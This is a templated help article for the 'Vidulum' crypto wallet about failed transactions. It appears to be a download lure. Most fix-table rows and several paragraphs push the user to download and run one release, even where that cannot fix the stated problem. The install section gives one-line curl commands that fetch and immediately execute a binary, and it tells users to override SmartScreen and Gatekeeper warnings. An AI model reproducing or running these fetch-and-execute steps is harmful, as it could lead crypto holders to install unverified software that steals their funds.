![Vidulum](../assets/banner-article.png)

# Vidulum Send Error: Why a Transaction Fails and What to Check

The four checks that explain most failed sends, in the order worth trying.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Start from the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) before diagnosing anything.

> A failed send is not a lost coin. Until an explorer shows the transaction, nothing left your wallet.

Most send failures come down to four causes: not enough of the fee coin, a destination on the wrong network, an unreachable chain, or a build that predates the fix. Work through them in that order. The first job is to establish whether the transaction was broadcast at all, because the answer decides what to do next.

<!-- ARTICLE-BODY-BEGIN -->

## First, was it broadcast?

A send either never left the wallet or it left and failed on-chain. These look similar in the interface and mean different things.

Check the destination address on a block explorer for the chain you sent on. If the transaction appears, it was broadcast: the network has an opinion about it now, and retrying creates a second transaction. If nothing appears at all, it was never broadcast, and the send can be retried safely.

Do this before changing anything. Retrying a transaction that did broadcast is the one action that can genuinely cost you a second send.

## The four checks, in order

| Symptom | Cause | Fix |
| --- | --- | --- |
| Error appears immediately, nothing on the explorer | Not enough of the chain's fee coin left to pay for the send | Download and run the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a>, keep a fee balance, retry |
| Address rejected, or funds never arrive | Destination chain differs from the sending chain | Confirm the network, then retry to an address on the same chain |
| Send hangs, balance unchanged | Chain unreachable or still syncing | Run the current release, check <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a> |
| Error repeats after several attempts | Build older than the current release | Install the current release, then retry once |

The order matters because the cheap checks come first. A fee shortfall takes ten seconds to rule out and explains a large share of reports.

## Fee shortfall, the most common cause

Every chain charges its fee in its own coin. Sending the entire balance of that coin leaves nothing to pay with, and the send fails in a way that reads like a software error rather than a balance problem.

Keep a small reserve of the chain's own coin whenever you move the whole position. On EVM chains that is the native token, on UTXO chains it is the same coin you are spending.

## Wrong-chain destinations

The same address format can exist on several chains. An EVM address is valid on six of them, so a send that looks correct can be aimed at the wrong network entirely, and the receiving wallet will show nothing because nothing arrived there.

Confirm the network in both wallets before confirming the send. If the destination address came from a chat message, treat the chain as unknown until you have verified it independently.

If the balance rather than the send looks wrong, <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a> covers the explorer-first check.

## What not to do

- Do not retry repeatedly without checking the explorer first.
- Do not send a second transaction to "push through" the first.
- Do not paste your recovery phrase into anything that offers to fix the send.
- Do not accept remote help that asks to see your screen while you restore.

None of those fix a broadcast problem, and two of them create a worse one.

The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> page explains what to include if the problem survives all four checks.

The <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> is the first step in every row above.

## FAQ

### Are my coins lost if the send failed?

No. A failed send leaves the balance with you. Confirm on an explorer; if there is no transaction, nothing moved.

### Why does it say insufficient funds when I have a balance?

The fee is paid in the chain's own coin, and the balance you are looking at may be a different asset. Leave a reserve of the fee coin.

### Will updating fix my specific error?

Updating is the right first step, but no release note in the material behind this page ties a fix to a specific error. Update, then work through the four checks.

### Can support reverse a failed transaction?

No. Transactions are not reversible, and support cannot move coins for you. They can help you read what happened.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Network disconnected checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md) - [Balance not showing](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md) - [Wallet fees](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-fees-network-fees-only.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
